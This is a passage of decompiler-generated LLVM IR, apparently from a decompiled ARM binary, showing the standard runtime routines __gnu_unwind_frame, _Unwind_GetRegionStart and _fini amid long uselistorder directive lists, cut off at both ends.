42, 291, 292, 317, 318, 379, 380, 381, 382, 383, 384, 385, 386, 50 }
  uselistorder i32* @r7, { 89, 90, 91, 93, 94, 92, 95, 96, 97, 98, 0, 99, 100, 101, 113, 102, 103, 104, 105, 106, 107, 3, 108, 109, 110, 111, 112, 2, 1, 114, 38, 39, 40, 41, 77, 78, 79, 80, 81, 82, 247, 42, 4, 43, 44, 45, 5, 46, 47, 48, 49, 6, 50, 51, 7, 52, 53, 54, 8, 55, 56, 57, 58, 59, 9, 60, 61, 62, 63, 64, 10, 65, 66, 67, 68, 22, 23, 11, 24, 25, 26, 27, 28, 29, 12, 30, 31, 32, 33, 34, 35, 36, 37, 69, 73, 70, 71, 72, 74, 75, 76, 83, 84, 184, 185, 186, 187, 188, 189, 248, 249, 250, 251, 262, 263, 159, 160, 161, 162, 115, 116, 117, 118, 252, 253, 254, 255, 256, 190, 191, 192, 193, 194, 195, 196, 197, 198, 163, 164, 13, 85, 86, 87, 88, 14, 19, 20, 199, 200, 205, 206, 207, 208, 209, 210, 211, 201, 202, 203, 204, 178, 179, 180, 181, 182, 183, 212, 213, 214, 215, 216, 217, 218, 219, 15, 220, 221, 222, 223, 224, 165, 166, 167, 168, 225, 228, 229, 230, 226, 227, 169, 170, 171, 172, 173, 231, 234, 235, 236, 232, 233, 132, 133, 18, 174, 175, 237, 240, 241, 242, 238, 239, 157, 158, 119, 122, 123, 124, 120, 121, 134, 135, 136, 137, 138, 143, 144, 145, 146, 139, 140, 141, 142, 147, 148, 149, 150, 151, 152, 153, 154, 125, 126, 243, 244, 245, 246, 155, 156, 176, 177, 127, 16, 128, 129, 130, 131, 257, 17, 258, 259, 260, 261, 21 }
  uselistorder i32* @lr, { 3, 0, 22, 23, 24, 25, 33, 26, 27, 28, 29, 1, 30, 31, 32, 34, 35, 36, 37, 118, 119, 121, 122, 7, 8, 123, 124, 125, 126, 127, 128, 129, 130, 131, 11, 12, 13, 14, 15, 16, 17, 18, 19, 9, 10, 20, 132, 133, 134, 135, 136, 141, 50, 51, 38, 39, 139, 140, 71, 72, 73, 74, 75, 21, 137, 138, 76, 77, 78, 79, 80, 58, 59, 60, 81, 94, 95, 82, 83, 84, 85, 86, 87, 88, 2, 89, 90, 92, 93, 91, 54, 55, 96, 97, 4, 56, 57, 98, 99, 5, 100, 101, 44, 45, 46, 47, 48, 49, 102, 103, 120, 40, 41, 42, 43, 6, 52, 53, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117 }
  uselistorder i32* @r6, { 83, 84, 85, 96, 86, 18, 87, 2, 88, 89, 3, 90, 91, 92, 93, 94, 95, 97, 0, 98, 99, 41, 42, 39, 40, 43, 201, 202, 4, 203, 204, 205, 206, 26, 27, 44, 5, 45, 46, 47, 48, 49, 16, 50, 51, 52, 6, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 24, 25, 28, 29, 30, 31, 7, 32, 33, 34, 8, 35, 36, 37, 38, 65, 19, 66, 17, 9, 10, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 137, 138, 139, 140, 210, 141, 11, 142, 143, 12, 78, 79, 80, 81, 82, 20, 13, 21, 14, 22, 207, 208, 209, 144, 148, 149, 150, 151, 145, 146, 147, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 152, 177, 178, 179, 153, 154, 155, 156, 157, 15, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 173, 175, 169, 170, 171, 172, 174, 176, 100, 101, 1, 102, 121, 122, 180, 181, 182, 183, 184, 123, 124, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 195, 196, 197, 198, 199, 136, 200, 23 }
  uselistorder label %dec_label_pc_22cb8, { 1, 0 }
  uselistorder label %dec_label_pc_22c54, { 1, 0 }
  uselistorder label %dec_label_pc_22c00, { 1, 0 }
  uselistorder label %dec_label_pc_22bd8, { 1, 0 }
  uselistorder label %dec_label_pc_22b44, { 1, 0 }
  uselistorder label %dec_label_pc_22b28, { 1, 0 }
  uselistorder label %dec_label_pc_22b0c, { 1, 0 }
  uselistorder label %dec_label_pc_22abc, { 1, 0 }
  uselistorder label %dec_label_pc_22aa0, { 1, 0 }
  uselistorder label %dec_label_pc_22a1c, { 1, 0 }
  uselistorder label %dec_label_pc_22a00, { 1, 0 }
  uselistorder label %dec_label_pc_2293c, { 2, 4, 5, 3, 0, 6, 7, 1 }
  uselistorder label %dec_label_pc_2290c, { 3, 4, 5, 0, 6, 2, 7, 1, 10, 11, 8, 9 }
  uselistorder label %dec_label_pc_228f4, { 1, 0 }
  uselistorder label %dec_label_pc_228d8, { 1, 0 }
  uselistorder label %dec_label_pc_2263c.backedge, { 2, 6, 4, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_22764, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_22758, { 0, 2, 1 }
  uselistorder label %dec_label_pc_2274c, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %dec_label_pc_226fc, { 1, 0 }
  uselistorder label %dec_label_pc_226ec, { 1, 0 }
  uselistorder label %dec_label_pc_22678, { 2, 1, 0 }
}

define i32 @__gnu_unwind_frame(i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %uws_-20 = alloca %anon_struct_18.49, align 8
  %v1_22d40 = add i32 %ucbp, 76
  %v2_22d40 = inttoptr i32 %v1_22d40 to i32*
  %v3_22d40 = load i32, i32* %v2_22d40, align 4
  %v1_22d44 = add i32 %v3_22d40, 4
  %v2_22d44 = inttoptr i32 %v1_22d44 to i32*
  %v3_22d44 = load i32, i32* %v2_22d44, align 4
  %v3_22d4c = mul i32 %v3_22d44, 256
  %v4_22d54 = getelementptr inbounds %anon_struct_18.49, %anon_struct_18.49* %uws_-20, i32 0, i32 0
  store i32 %v3_22d4c, i32* %v4_22d54, align 8
  %tmp7 = bitcast %anon_struct_18.49* %uws_-20 to %anon_struct_18*
  %v4_22d74 = call i32 @__gnu_unwind_execute(i32 %context, %anon_struct_18* %tmp7)
  ret i32 %v4_22d74

; uselistorder directives
  uselistorder %anon_struct_18.49* %uws_-20, { 1, 0 }
  uselistorder i32 (i32, %anon_struct_18*)* @__gnu_unwind_execute, { 1, 0 }
  uselistorder i32 256, { 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 97, 93, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 77, 94, 91, 92, 47, 49, 48, 50, 76, 51, 52, 53, 0, 90, 1, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 81, 82, 95, 96, 83, 84, 78, 85, 86, 64, 65, 66, 67, 87, 68, 69, 70, 71, 88, 72, 89, 73, 74, 79, 75, 80 }
  uselistorder i32 4, { 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 134, 287, 288, 289, 290, 291, 7, 294, 295, 292, 293, 296, 8, 297, 298, 299, 300, 9, 317, 10, 301, 302, 303, 304, 305, 11, 306, 12, 307, 308, 309, 310, 311, 312, 313, 13, 314, 188, 315, 316, 318, 319, 320, 321, 14, 322, 15, 247, 248, 249, 250, 266, 267, 459, 228, 229, 366, 234, 251, 16, 17, 462, 18, 19, 133, 128, 129, 20, 463, 130, 464, 113, 21, 22, 131, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 23, 482, 483, 484, 485, 486, 487, 112, 488, 489, 490, 491, 492, 493, 24, 25, 132, 494, 259, 135, 257, 258, 252, 253, 254, 255, 256, 230, 231, 232, 233, 235, 236, 237, 238, 239, 240, 26, 241, 136, 242, 243, 244, 245, 246, 189, 260, 261, 262, 263, 264, 265, 27, 268, 269, 270, 271, 334, 335, 272, 273, 274, 495, 28, 190, 137, 191, 497, 29, 498, 192, 227, 496, 116, 275, 276, 372, 373, 374, 375, 193, 114, 401, 402, 403, 404, 405, 406, 194, 195, 30, 407, 408, 409, 410, 411, 412, 413, 414, 196, 399, 400, 382, 383, 384, 385, 386, 387, 388, 389, 390, 31, 391, 392, 393, 415, 32, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 197, 198, 199, 430, 431, 434, 437, 432, 433, 138, 200, 435, 104, 436, 438, 439, 440, 442, 201, 34, 33, 441, 202, 203, 204, 330, 35, 36, 37, 205, 105, 38, 39, 336, 337, 338, 339, 340, 40, 341, 115, 443, 444, 223, 41, 42, 460, 461, 224, 43, 44, 445, 117, 139, 323, 140, 376, 141, 324, 325, 142, 377, 206, 225, 145, 118, 207, 45, 208, 209, 144, 146, 46, 378, 47, 379, 48, 380, 210, 381, 211, 212, 213, 143, 147, 214, 103, 326, 106, 110, 49, 148, 328, 327, 50, 215, 149, 329, 0, 1, 362, 150, 107, 152, 151, 153, 226, 154, 331, 332, 51, 156, 155, 157, 52, 53, 54, 55, 216, 217, 56, 57, 333, 58, 342, 59, 158, 159, 343, 60, 108, 119, 344, 61, 62, 120, 160, 345, 63, 346, 64, 65, 121, 161, 347, 66, 348, 67, 68, 122, 162, 349, 350, 69, 2, 351, 352, 70, 71, 353, 354, 163, 123, 164, 355, 72, 3, 356, 73, 74, 124, 165, 357, 75, 4, 358, 76, 77, 125, 166, 359, 168, 169, 360, 78, 361, 79, 167, 80, 126, 170, 363, 364, 81, 365, 82, 171, 83, 127, 172, 109, 111, 84, 394, 446, 367, 85, 368, 369, 370, 371, 5, 6, 218, 395, 86, 174, 177, 396, 87, 88, 89, 90, 175, 91, 92, 93, 94, 173, 176, 397, 219, 220, 186, 398, 447, 181, 448, 449, 450, 451, 452, 182, 453, 183, 184, 454, 95, 455, 456, 179, 185, 96, 97, 98, 99, 100, 101, 102, 178, 180, 457, 221, 222, 187, 458 }
  uselistorder i32 76, { 18, 19, 20, 21, 22, 23, 0, 3, 5, 4, 6, 2, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 1 }
  uselistorder i32 1, { 608, 1001, 1002, 424, 1006, 1007, 1008, 1009, 437, 1010, 1011, 399, 411, 438, 1003, 1004, 1005, 1012, 425, 1013, 609, 136, 133, 138, 137, 134, 135, 132, 610, 611, 612, 613, 439, 440, 1014, 1015, 388, 616, 615, 614, 76, 77, 81, 78, 80, 79, 619, 618, 617, 271, 441, 442, 216, 1016, 69, 1017, 622, 621, 620, 44, 1018, 1019, 1020, 1021, 624, 623, 204, 206, 207, 205, 208, 124, 125, 395, 625, 273, 952, 626, 274, 275, 276, 627, 120, 953, 954, 955, 221, 220, 222, 223, 628, 102, 629, 13, 10, 11, 9, 12, 630, 427, 925, 99, 100, 98, 75, 74, 1250, 412, 443, 1251, 1, 0, 631, 92, 87, 85, 86, 93, 90, 91, 88, 89, 84, 444, 82, 632, 278, 279, 277, 400, 421, 401, 1099, 1100, 1101, 1102, 413, 633, 280, 635, 634, 281, 282, 931, 636, 956, 957, 958, 1253, 960, 959, 389, 637, 404, 961, 405, 1254, 927, 926, 1255, 406, 1256, 1257, 1258, 1259, 1260, 1261, 910, 1262, 1263, 1264, 1265, 1266, 1267, 911, 605, 639, 638, 283, 287, 288, 290, 285, 284, 286, 289, 291, 293, 292, 965, 962, 963, 964, 416, 407, 19, 20, 21, 22, 445, 966, 967, 982, 983, 640, 606, 23, 24, 974, 912, 975, 976, 913, 977, 978, 979, 980, 981, 245, 237, 238, 240, 243, 241, 239, 244, 236, 242, 968, 969, 970, 446, 971, 972, 973, 641, 297, 295, 294, 296, 302, 298, 299, 301, 300, 984, 985, 986, 642, 200, 199, 196, 195, 194, 201, 197, 198, 202, 987, 988, 989, 990, 643, 189, 190, 188, 192, 191, 193, 644, 179, 929, 447, 928, 417, 647, 646, 645, 305, 311, 303, 307, 306, 310, 308, 309, 312, 304, 448, 930, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 408, 648, 314, 313, 315, 316, 317, 319, 318, 943, 944, 945, 946, 947, 948, 949, 950, 951, 649, 252, 258, 256, 255, 253, 259, 254, 257, 449, 942, 650, 178, 991, 992, 993, 994, 995, 450, 651, 103, 104, 105, 107, 106, 451, 108, 652, 54, 53, 50, 51, 52, 48, 49, 653, 261, 262, 269, 270, 265, 266, 267, 268, 263, 264, 654, 152, 150, 151, 655, 320, 656, 127, 126, 657, 122, 121, 658, 118, 117, 659, 1047, 111, 114, 112, 113, 321, 109, 110, 660, 101, 661, 185, 662, 663, 209, 210, 1268, 1269, 1270, 452, 1271, 1272, 453, 1273, 666, 665, 664, 55, 57, 62, 56, 60, 59, 63, 61, 64, 58, 667, 180, 454, 668, 322, 323, 324, 669, 331, 329, 330, 328, 325, 326, 327, 670, 145, 146, 144, 147, 143, 671, 672, 128, 674, 673, 116, 115, 675, 246, 1154, 678, 677, 676, 212, 213, 679, 248, 250, 249, 251, 409, 680, 381, 996, 455, 456, 997, 998, 999, 227, 228, 226, 232, 229, 230, 231, 233, 681, 29, 32, 30, 31, 28, 27, 25, 26, 383, 390, 1109, 682, 37, 34, 35, 36, 38, 33, 1110, 1111, 1112, 683, 333, 332, 340, 339, 334, 341, 336, 337, 335, 342, 338, 83, 396, 922, 923, 924, 684, 685, 70, 402, 1048, 403, 1049, 1050, 397, 1051, 344, 350, 343, 346, 349, 348, 347, 351, 345, 1052, 1274, 414, 457, 687, 686, 688, 1155, 1158, 1159, 1160, 689, 352, 357, 358, 356, 355, 359, 353, 354, 1161, 1162, 1163, 1164, 690, 364, 370, 363, 369, 368, 362, 372, 371, 366, 360, 365, 361, 367, 1156, 1157, 458, 165, 167, 166, 45, 1133, 459, 1134, 1135, 1136, 1137, 1138, 691, 40, 41, 39, 42, 1165, 182, 181, 1166, 1167, 1168, 1169, 1170, 1171, 428, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 461, 1180, 1181, 1182, 1183, 1184, 460, 1185, 1186, 1187, 1188, 1189, 692, 155, 157, 153, 156, 161, 163, 160, 162, 164, 158, 159, 154, 142, 141, 462, 463, 398, 696, 695, 694, 693, 123, 43, 410, 119, 697, 184, 183, 698, 140, 139, 699, 96, 700, 373, 701, 702, 374, 703, 97, 704, 375, 705, 706, 376, 707, 72, 71, 708, 66, 65, 709, 225, 224, 710, 711, 377, 712, 176, 175, 713, 714, 378, 715, 914, 915, 916, 917, 918, 919, 920, 1275, 5, 6, 7, 8, 716, 1053, 464, 14, 15, 1000, 717, 169, 168, 465, 1054, 718, 148, 149, 466, 719, 131, 129, 130, 1055, 720, 18, 16, 17, 721, 95, 94, 722, 723, 379, 724, 73, 725, 380, 726, 47, 46, 727, 171, 170, 728, 203, 730, 729, 67, 68, 731, 219, 732, 186, 187, 177, 1190, 384, 1191, 385, 1252, 173, 172, 430, 733, 431, 432, 433, 434, 435, 734, 436, 1056, 1057, 736, 735, 467, 1192, 1193, 1194, 1195, 1196, 737, 1197, 1198, 740, 739, 738, 1199, 426, 1200, 1201, 741, 1202, 1203, 742, 1204, 1205, 1206, 394, 1207, 1208, 1209, 1210, 743, 1211, 744, 745, 746, 747, 1113, 1114, 1115, 749, 748, 468, 469, 470, 471, 753, 752, 751, 750, 607, 1022, 754, 1116, 756, 755, 174, 758, 757, 759, 760, 761, 1023, 1024, 472, 764, 763, 762, 473, 474, 1117, 766, 765, 1118, 486, 485, 484, 483, 482, 481, 480, 479, 478, 1120, 475, 1121, 1122, 487, 1123, 476, 477, 1124, 2, 3, 1125, 1126, 1127, 488, 1128, 489, 1131, 781, 780, 779, 778, 777, 776, 775, 774, 773, 772, 771, 770, 769, 768, 767, 1119, 490, 247, 1025, 1026, 492, 493, 1027, 392, 494, 1028, 495, 496, 1030, 497, 1029, 391, 498, 499, 500, 1031, 501, 789, 788, 787, 786, 785, 784, 783, 782, 491, 1032, 1033, 1034, 1035, 429, 1036, 502, 415, 1037, 1038, 790, 1140, 1141, 1142, 792, 791, 1095, 793, 218, 1039, 797, 796, 795, 794, 504, 503, 505, 506, 800, 799, 798, 507, 801, 508, 802, 921, 511, 1040, 509, 1041, 1042, 1043, 510, 512, 513, 1044, 1045, 514, 515, 516, 1046, 517, 518, 519, 820, 819, 818, 817, 816, 815, 814, 813, 812, 811, 810, 809, 808, 807, 806, 805, 804, 803, 1058, 1059, 828, 827, 826, 825, 824, 823, 822, 821, 831, 830, 829, 520, 386, 387, 420, 1060, 393, 422, 423, 1061, 1062, 1063, 1064, 1065, 837, 836, 835, 834, 833, 832, 521, 522, 1066, 523, 524, 842, 841, 840, 839, 838, 1129, 525, 418, 1130, 419, 1069, 846, 845, 844, 843, 1067, 1068, 526, 527, 849, 848, 847, 211, 1070, 1071, 528, 529, 1072, 1074, 530, 1075, 531, 1073, 532, 851, 850, 1076, 1077, 1078, 533, 534, 854, 853, 852, 1079, 1080, 1081, 535, 536, 537, 856, 855, 1082, 1083, 1084, 1085, 538, 539, 540, 541, 542, 543, 863, 862, 861, 860, 859, 858, 857, 1086, 1087, 1088, 544, 545, 546, 547, 865, 864, 1089, 1090, 1091, 548, 549, 550, 551, 867, 866, 214, 1092, 1093, 1094, 552, 553, 554, 874, 873, 872, 871, 870, 869, 868, 234, 235, 1096, 1097, 1098, 555, 556, 557, 876, 875, 1103, 877, 217, 1139, 558, 879, 878, 272, 880, 1212, 1104, 559, 1105, 560, 1106, 1107, 4, 1108, 881, 260, 1132, 882, 883, 1143, 561, 1144, 571, 572, 1145, 1146, 562, 1147, 565, 563, 1148, 566, 567, 1149, 568, 1150, 569, 570, 1151, 1152, 1153, 908, 573, 894, 893, 892, 891, 890, 889, 888, 887, 564, 886, 885, 884, 1213, 583, 584, 1214, 1215, 585, 586, 1216, 587, 592, 1217, 593, 1218, 594, 1219, 591, 595, 1220, 1221, 1222, 1223, 1224, 596, 1225, 597, 1226, 598, 1227, 1228, 1229, 1230, 1231, 1232, 588, 589, 590, 1233, 1234, 599, 1235, 600, 1236, 601, 574, 1237, 602, 603, 1238, 1239, 575, 1240, 576, 1241, 577, 1242, 578, 1243, 579, 1244, 580, 1245, 581, 582, 1246, 1247, 1248, 909, 1249, 604, 905, 904, 903, 902, 901, 900, 899, 898, 897, 896, 895, 215, 906, 907, 382 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_22da0 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_22da8 = add i32 %tmp1, 72
  %v2_22da8 = inttoptr i32 %v1_22da8 to i32*
  %v3_22da8 = load i32, i32* %v2_22da8, align 4
  ret i32 %v3_22da8

; uselistorder directives
  uselistorder i32 72, { 7, 8, 0, 9, 2, 3, 1, 4, 10, 11, 5, 6, 12 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 8, 7, 10, 9, 52, 53, 54, 55, 12, 13, 46, 14, 140, 38, 11, 141, 142, 143, 144, 145, 147, 148, 146, 149, 150, 151, 152, 153, 154, 155, 15, 16, 17, 18, 20, 19, 21, 39, 40, 22, 23, 41, 42, 43, 44, 45, 47, 48, 61, 49, 50, 156, 6, 3, 51, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 1, 91, 92, 93, 94, 95, 24, 96, 116, 25, 26, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 135, 128, 129, 130, 131, 132, 133, 134, 136, 137, 27, 138, 5, 62, 63, 28, 64, 65, 66, 29, 30, 31, 32, 56, 0, 83, 37, 84, 85, 86, 87, 88, 89, 2, 57, 58, 33, 59, 60, 4, 34, 90, 67, 35, 68, 36, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 97, 98, 139 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_22dbc = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_22dbc)
  %v31_22dc4 = load i32, i32* @r0, align 4
  ret i32 %v31_22dc4

; uselistorder directives
  uselistorder i32* @r0, { 12, 13, 14, 97, 98, 165, 15, 19, 85, 95, 166, 169, 170, 78, 16, 167, 168, 121, 44, 7, 171, 8, 17, 86, 0, 87, 9, 10, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 1, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 88, 18, 79, 80, 81, 82, 83, 84, 89, 90, 91, 92, 93, 94, 20, 137, 21, 138, 22, 23, 24, 25, 111, 112, 198, 199, 201, 72, 73, 74, 75, 26, 118, 119, 2, 27, 28, 103, 104, 3, 29, 30, 202, 203, 4, 31, 46, 139, 140, 5, 47, 48, 76, 77, 200, 113, 96, 141, 32, 70, 71, 142, 6, 143, 144, 145, 133, 68, 134, 135, 69, 33, 146, 147, 148, 149, 150, 105, 106, 34, 126, 35, 127, 151, 36, 152, 128, 37, 129, 153, 38, 154, 155, 39, 156, 107, 40, 108, 130, 41, 42, 114, 115, 116, 109, 157, 43, 158, 45, 99, 100, 131, 132, 101, 102, 136, 67, 110, 11, 64, 65, 117, 120, 123, 124, 122, 66, 125, 159, 160, 161, 162, 163, 164, 49, 57, 58, 59, 60, 61, 62, 63, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder void (i32)* @__pseudo_branch, { 16, 56, 49, 50, 51, 52, 53, 54, 55, 57, 58, 59, 92, 32, 33, 34, 35, 36, 37, 28, 29, 30, 31, 38, 39, 40, 41, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 42, 43, 44, 93, 99, 100, 101, 102, 103, 104, 105, 94, 109, 110, 111, 112, 80, 81, 45, 46, 47, 69, 70, 71, 72, 73, 74, 75, 76, 82, 95, 96, 97, 98, 106, 107, 108, 83, 84, 85, 0, 77, 78, 79, 86, 90, 91, 87, 88, 89, 113, 62, 63, 64, 65, 66, 67, 60, 61, 1, 68, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 48 }
  uselistorder i32 0, { 378, 377, 440, 441, 1160, 382, 381, 442, 1161, 1162, 1163, 1164, 286, 285, 443, 1165, 1166, 215, 1167, 1169, 1170, 163, 164, 1171, 1172, 1168, 106, 107, 108, 109, 2, 1, 3, 0, 204, 203, 205, 206, 207, 1173, 379, 380, 155, 151, 1174, 1175, 209, 210, 208, 211, 1176, 1177, 1178, 1179, 214, 213, 212, 1180, 1181, 1182, 365, 364, 444, 383, 445, 384, 446, 385, 447, 448, 449, 165, 1183, 399, 398, 1184, 1185, 397, 396, 1186, 450, 394, 395, 392, 393, 391, 390, 1187, 389, 388, 387, 386, 291, 1188, 1204, 1189, 218, 1190, 1191, 1192, 1193, 1194, 1195, 220, 1197, 1198, 216, 217, 1199, 1200, 148, 166, 1201, 1202, 949, 110, 111, 366, 367, 219, 1196, 1203, 290, 1205, 451, 452, 1206, 401, 400, 221, 1207, 1208, 222, 1209, 1210, 1211, 126, 453, 454, 1212, 223, 1213, 167, 1214, 1215, 224, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 36, 149, 455, 1226, 225, 1227, 1228, 1229, 4, 1230, 1231, 5, 1232, 1233, 1138, 1139, 6, 156, 1544, 456, 1545, 1052, 1053, 1054, 1055, 1056, 1060, 1057, 1058, 1059, 7, 292, 112, 1061, 457, 1062, 1063, 1064, 402, 403, 1140, 1141, 8, 458, 997, 459, 1546, 1547, 1548, 9, 10, 168, 169, 170, 1563, 1564, 11, 998, 171, 172, 1319, 1320, 1321, 1322, 226, 227, 1323, 1007, 228, 150, 56, 1565, 113, 293, 1569, 1570, 57, 1065, 127, 1066, 1067, 1068, 294, 173, 1566, 1567, 1568, 295, 12, 1571, 1572, 1573, 1574, 1575, 1578, 1579, 1580, 1581, 1582, 1583, 1584, 1585, 1586, 1587, 1576, 1577, 1588, 1589, 1590, 1591, 1592, 1593, 1594, 1595, 37, 1596, 1597, 1598, 1599, 1600, 38, 1601, 1602, 1603, 39, 1604, 1605, 1606, 40, 1607, 1608, 1609, 1610, 1611, 1612, 1613, 1614, 1615, 1616, 1617, 1618, 1619, 1620, 1621, 1622, 1623, 1624, 1625, 1626, 1627, 1628, 1629, 1630, 1633, 1634, 1635, 1636, 1637, 1638, 1639, 1631, 1632, 1640, 1641, 1642, 1643, 1644, 1645, 1646, 1647, 1648, 1649, 41, 1650, 1651, 1652, 1653, 1654, 42, 1655, 1656, 1657, 1658, 1659, 43, 1660, 1661, 1662, 1663, 1664, 1665, 1666, 1667, 1668, 1669, 1670, 1671, 1672, 1673, 1674, 229, 1069, 950, 1070, 1071, 1072, 1073, 1107, 460, 461, 1108, 1109, 174, 175, 176, 233, 1074, 231, 1075, 1096, 1089, 951, 1090, 1091, 1092, 1093, 58, 59, 130, 1094, 1095, 296, 1097, 1098, 952, 1099, 230, 1100, 60, 61, 129, 1101, 1102, 953, 1103, 1104, 62, 63, 128, 1105, 232, 1106, 177, 1076, 954, 1077, 1078, 462, 1079, 1080, 955, 1081, 1082, 1085, 1083, 1084, 297, 1086, 64, 65, 132, 1087, 956, 66, 67, 131, 1088, 1110, 957, 1111, 1112, 1113, 1114, 1115, 1116, 958, 1117, 1118, 1119, 1120, 1000, 999, 300, 1002, 1003, 1001, 298, 299, 1004, 1005, 463, 1006, 178, 1008, 1009, 959, 1010, 1011, 1012, 960, 1013, 1014, 68, 69, 133, 1015, 1016, 1017, 114, 115, 1018, 1019, 1020, 234, 1021, 1022, 1023, 1024, 1025, 464, 1026, 1027, 1028, 1029, 1030, 1031, 179, 1034, 961, 1035, 1036, 70, 71, 135, 1037, 1038, 1039, 962, 1040, 1041, 1042, 1043, 963, 1044, 1045, 72, 73, 134, 1046, 1047, 1048, 1049, 1050, 235, 237, 1032, 236, 1033, 238, 1051, 180, 1121, 1126, 1127, 1122, 1123, 1124, 1129, 1130, 1131, 239, 1132, 1133, 1134, 1135, 1136, 1125, 1128, 1137, 181, 1142, 1143, 1144, 465, 1266, 466, 1145, 1549, 1550, 1551, 240, 1552, 1408, 1407, 1409, 1379, 1410, 1147, 1146, 1148, 1267, 1268, 1269, 1675, 1676, 1677, 1678, 241, 1679, 1680, 1681, 1411, 1412, 362, 363, 467, 1686, 967, 1687, 468, 1688, 1689, 469, 1690, 1691, 965, 242, 302, 1692, 966, 1693, 470, 116, 1694, 1695, 471, 1710, 1711, 1714, 964, 301, 1715, 404, 183, 182, 1712, 1713, 1682, 1683, 968, 243, 287, 988, 13, 14, 1706, 1307, 1240, 1705, 1413, 1414, 152, 245, 1415, 969, 244, 1416, 1417, 1696, 1697, 1698, 1699, 472, 1700, 184, 1334, 1335, 153, 1149, 1150, 970, 1151, 473, 1152, 1153, 1154, 1155, 1156, 74, 75, 136, 1157, 76, 77, 137, 1336, 1337, 119, 304, 1341, 1338, 1339, 971, 1340, 1342, 972, 1343, 1344, 1345, 1346, 78, 79, 138, 1347, 246, 1348, 1349, 1350, 1352, 1351, 303, 989, 991, 990, 247, 992, 993, 994, 474, 995, 185, 973, 1684, 1685, 1270, 1271, 1272, 1273, 1274, 1275, 249, 186, 1276, 1277, 1278, 154, 248, 1279, 187, 476, 477, 1701, 475, 188, 1422, 1423, 1424, 1425, 1426, 250, 1427, 1428, 1429, 1430, 1431, 1432, 1433, 251, 1418, 478, 1419, 1420, 479, 1421, 189, 974, 252, 253, 1380, 480, 254, 1381, 1382, 1383, 1384, 1385, 190, 261, 255, 259, 257, 260, 258, 262, 264, 263, 256, 1434, 1435, 1459, 1460, 191, 1436, 1437, 268, 266, 267, 1438, 1439, 274, 273, 202, 265, 1440, 1441, 1442, 1443, 1444, 1445, 369, 368, 405, 481, 1446, 1447, 1448, 117, 1449, 270, 269, 271, 272, 201, 1450, 1451, 305, 1452, 1453, 159, 1454, 1455, 1456, 1457, 1458, 15, 16, 1241, 1242, 118, 17, 406, 482, 1461, 1462, 1354, 1353, 1464, 1463, 1356, 1355, 1466, 1465, 1280, 1467, 1357, 1469, 1468, 1306, 1244, 1243, 1324, 1716, 1717, 139, 192, 1281, 1282, 1283, 275, 1158, 1159, 276, 1284, 1289, 1290, 1291, 1292, 277, 1285, 278, 1286, 1287, 193, 1293, 1294, 483, 1470, 1702, 1703, 1704, 1245, 1472, 1471, 1295, 1246, 1358, 1247, 1248, 1249, 1250, 1707, 1708, 1709, 1288, 18, 1473, 1474, 1475, 1476, 157, 1477, 279, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 280, 975, 978, 976, 977, 1485, 1486, 1487, 1488, 1489, 1490, 19, 1553, 1554, 1555, 158, 1556, 1557, 1558, 1559, 1560, 281, 1561, 979, 982, 980, 981, 1562, 983, 433, 370, 434, 435, 1296, 407, 436, 484, 485, 80, 408, 409, 81, 82, 120, 1491, 306, 160, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1504, 410, 411, 1505, 486, 307, 487, 308, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 140, 121, 532, 437, 534, 535, 533, 438, 537, 538, 539, 540, 536, 439, 541, 309, 1359, 